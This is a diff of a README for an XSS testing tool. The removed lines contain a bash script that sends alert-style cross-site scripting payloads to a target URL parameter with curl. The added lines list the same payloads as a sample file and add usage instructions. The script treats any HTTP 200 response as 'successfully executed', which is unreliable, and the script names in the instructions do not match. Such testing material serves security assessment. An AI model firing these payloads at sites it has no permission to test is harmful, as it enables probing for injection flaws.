@@ -1,83 +1,79 @@
 # XSS-Testing-Script
-Here’s a **bash script** to automate **Cross-Site Scripting (XSS) testing** on a target URL. This script uses **curl** for HTTP requests and tests various XSS payloads against the provided URL.
+
+Here’s a more polished version of the script with a better design, default payloads, and enhanced user experience.
+
+
+### **Key Features**
+1. **Default Payloads**: Includes a predefined list of XSS payloads.
+2. **Custom Payloads**: Allows you to specify a file with custom payloads.
+3. **Single or Multiple URL Testing**:
+   - Test a single URL with `-u`.
+   - Test multiple URLs from a file with `-f`.
+4. **Clear Output Design**:
+   - Well-structured output with color-coded results in the terminal.
+   - Results saved to a timestamped file (`results_<timestamp>.txt`).
+5. **User-Friendly Help Menu**:
+   - Comprehensive usage guide with examples.
+6. **Error Handling**:
+   - Checks for missing files or invalid inputs.
 
 ---
 
-### **XSS Testing Script**
+### **How to Use**
+1. **Save the Script**: Save as `xss_test.sh`.
+2. **Make Executable**:
+   ```bash
+   chmod +x xss_test.sh
+   ```
+3. **Run the Script**:
+   - Test a single URL:
+     ```bash
+     ./xss_test.sh -u "https://example.com/search?q="
+     ```
+   - Test multiple URLs from a file:
+     ```bash
+     ./xss_test.sh -f urls.txt
+     ```
+   - Use custom payloads:
+     ```bash
+     ./xss_test.sh -u "https://example.com/search?q=" -p payloads.txt
+     ```
+   - Save results to a custom file:
+     ```bash
+     ./xss_test.sh -f urls.txt -o custom_results.txt
+     ```
 
-```bash
-#!/bin/bash
+---
 
-# XSS Testing Script
-# Usage: ./xss_test.sh <target_url> <parameter_name>
-# Example: ./xss_test.sh "https://example.com/search" "q"
+### **Sample Files**
 
-# Check for arguments
-if [ "$#" -ne 2 ]; then
-    echo "Usage: $0 <target_url> <parameter_name>"
-    exit 1
-fi
+#### `urls.txt`
+```
+https://example.com/search?q=
+https://example.org/comment?msg=
+https://testsite.net/input?value=
+```
 
-# Target URL and Parameter
-TARGET_URL=$1
-PARAM_NAME=$2
-
-# XSS Payloads
-PAYLOADS=(
-    "<script>alert('XSS')</script>"
-    "<img src=x onerror=alert('XSS')>"
-    "<svg/onload=alert('XSS')>"
-    "<iframe src=javascript:alert('XSS')></iframe>"
-    "';alert('XSS');//"
-    "\";alert('XSS');//"
-    "<body onload=alert('XSS')>"
-    "<marquee onstart=alert('XSS')>"
-    "<input autofocus onfocus=alert('XSS')>"
-    "<details open ontoggle=alert('XSS')>"
-)
-
-# Test each payload
-echo "Testing for XSS vulnerabilities on $TARGET_URL..."
-for PAYLOAD in "${PAYLOADS[@]}"; do
-    echo "Testing payload: $PAYLOAD"
-    
-    # URL Encode the payload
-    ENCODED_PAYLOAD=$(echo "$PAYLOAD" | jq -sRr @uri)
-
-    # Send request
-    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL?$PARAM_NAME=$ENCODED_PAYLOAD")
-
-    # Check response
-    if [[ $RESPONSE -eq 200 ]]; then
-        echo "Payload successfully executed: $PAYLOAD"
-    else
-        echo "No response or blocked: $PAYLOAD"
-    fi
-done
-
-echo "XSS testing completed."
+#### `payloads.txt`
+```
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+<iframe src=javascript:alert('XSS')></iframe>
 ```
 
 ---
 
+Would you like additional enhancements such as **parallel execution** or **HTML output reports**?
+
 ### **Steps to Use the Script**
-1. Save the script as `xss_test.sh`.
+1. Save the script as `xss_test02.sh`.
 2. Make the script executable:
    ```bash
-   chmod +x xss_test.sh
+   chmod +x xss_test02.sh
    ```
 3. Run the script with the target URL and parameter:
    ```bash
    ./xss_test.sh "https://example.com/search" "query"
    ```
 
----
-
-### **Features of the Script**
-1. **Payload Encoding**: Automatically encodes payloads to ensure proper injection.
-2. **HTTP Status Code Check**: Verifies if the payload was processed (200 OK status).
-3. **Customizable Payloads**: You can easily add more payloads to the `PAYLOADS` array.
-
----
-
-Would you like to extend this script with features like logging, reporting, or integration with tools like **Burp Suite**?
